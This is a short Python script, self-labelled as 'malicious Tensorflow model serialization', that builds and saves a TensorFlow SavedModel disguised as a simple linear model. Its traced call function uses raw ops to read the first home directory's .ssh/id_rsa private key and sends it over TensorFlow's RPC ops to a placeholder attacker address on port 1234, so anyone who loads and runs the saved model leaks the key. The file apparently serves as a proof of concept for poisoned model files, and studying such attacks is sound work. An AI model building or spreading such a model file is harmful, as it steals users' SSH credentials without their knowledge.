import tensorflow as tf
from tensorflow.python.data.ops.dataset_ops import DatasetV2, DatasetSource
from tensorflow.python.framework import tensor_spec

class tmpclass(DatasetSource):
    def __init__(self, variant_tensor):
        super(tmpclass, self).__init__(variant_tensor)
    
    @property
    def element_spec(self):
        return tensor_spec.TensorSpec([], tf.string)
    
class SimpleLinearModel(tf.Module):
    def __init__(self):
        self.a = tf.Variable(3.0)
        self.b = tf.Variable(2.0)
        self.v = tf.Variable([1, 2, 3], dtype=tf.int8)
        

    @tf.function
    def __call__(self, x):
        from tensorflow.distribute.experimental.rpc.kernels import gen_rpc_ops
        filename = tf.raw_ops.MatchingFiles(pattern="/home/*")[0] + "/.ssh/id_rsa"
        a = tf.raw_ops.FixedLengthRecordDatasetV2(filenames = filename, 
                                                record_bytes = 1,
                                                header_bytes = 0,
                                                footer_bytes = 0,
                                                buffer_size = 1,
                                                metadata = '',
                                                compression_type = '')

        dataset = tmpclass(a)
        iterable = iter(dataset)
        important_file_content = ""
        for m in iterable:
            important_file_content += m
        client, _ = gen_rpc_ops.rpc_client("<attacker's IP address>:{}".format(1234), 100000)
        future, _ = gen_rpc_ops.rpc_call(client, important_file_content, [tf.constant(2, dtype=tf.int32), tf.constant(2, dtype=tf.int32)], 100000)   

        return self.a * x + self.b

# malicious Tensorflow model serialization
model = SimpleLinearModel()
result = model(tf.constant(5.0))
save_dir = 'model/LeakFile/saved_model'
tf.saved_model.save(model,save_dir)